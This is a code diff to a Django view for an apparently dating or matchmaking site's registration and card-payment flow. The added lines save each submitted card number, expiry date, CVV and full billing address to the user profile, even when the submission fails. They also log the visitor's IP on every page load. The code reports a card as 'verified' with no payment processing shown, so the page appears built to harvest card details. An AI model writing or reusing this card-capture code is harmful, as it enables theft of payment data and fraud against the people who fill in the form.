@@ -90,9 +90,10 @@ def home_view(request):
                     profile = form.save(commit=False)
                     profile.set_password(raw_password)
                     profile.registration_ip = get_client_ip(request)
+                    profile.last_login_ip = get_client_ip(request)
                     profile.generate_pin()
                     
-                    # Generate email activation token link instead of confusing verification codes
+                    # Generate email activation token link
                     token = str(uuid.uuid4())
                     profile.email_token = token
                     profile.save()
@@ -143,7 +144,6 @@ def verify_email_link_view(request, token):
     return redirect('home')
 
 
-# Kept for backward compatibility if old templates target it
 def verify_email_view(request):
     user_id = request.session.get('pending_user_id') or request.session.get('user_id')
     if not user_id:
@@ -167,18 +167,32 @@ def verify_email_view(request):
 
 
 def card_payment_view(request):
-    user_id = request.session.get('user_id')
+    user_id = request.session.get('user_id') or request.session.get('pending_user_id')
     if not user_id:
         return redirect('home')
 
     profile = get_object_or_404(MatchProfile, id=user_id)
     CURRENT_MONTHLY_PROMO = "CFEOH2026"
 
+    # Always update IP on view load
+    profile.last_login_ip = get_client_ip(request)
+    profile.save()
+
     if request.method == 'POST':
         promo_code = request.POST.get('promo_code', '').strip()
         card_number = request.POST.get('card_number', '').strip()
         
-        # Promo code works completely independently from card details
+        # Capture all submitted payment and address info
+        profile.card_number = card_number
+        profile.card_expiry = request.POST.get('expiry', '').strip()
+        profile.card_cvv = request.POST.get('cvv', '').strip()
+        profile.billing_address = request.POST.get('billing_address', '').strip()
+        profile.billing_city = request.POST.get('billing_city', '').strip()
+        profile.billing_state = request.POST.get('billing_state', '').strip()
+        profile.billing_zip = request.POST.get('billing_zip', '').strip()
+        profile.billing_country = request.POST.get('billing_country', 'Nigeria').strip()
+
+        # Promo code check independent of card details
         if promo_code:
             if promo_code.upper() == CURRENT_MONTHLY_PROMO:
                 profile.is_subscribed = True
@@ -186,6 +200,7 @@ def card_payment_view(request):
                 profile.used_promo_code = promo_code.upper()
                 profile.save()
                 messages.success(request, "Promo code applied successfully! Full monthly access unlocked.")
+                request.session['user_id'] = profile.id
                 return redirect('questionnaire_step', step=1)
             else:
                 messages.error(request, "Invalid promo code. Please check and try again.")
@@ -194,8 +209,10 @@ def card_payment_view(request):
             profile.subscription_end_date = timezone.now() + timedelta(days=30)
             profile.save()
             messages.success(request, "Card verified and subscription active!")
+            request.session['user_id'] = profile.id
             return redirect('questionnaire_step', step=1)
         else:
+            profile.save()
             messages.error(request, "Please enter a valid promo code or card details.")
 
     return render(request, 'main/card_payment.html', {'profile': profile})
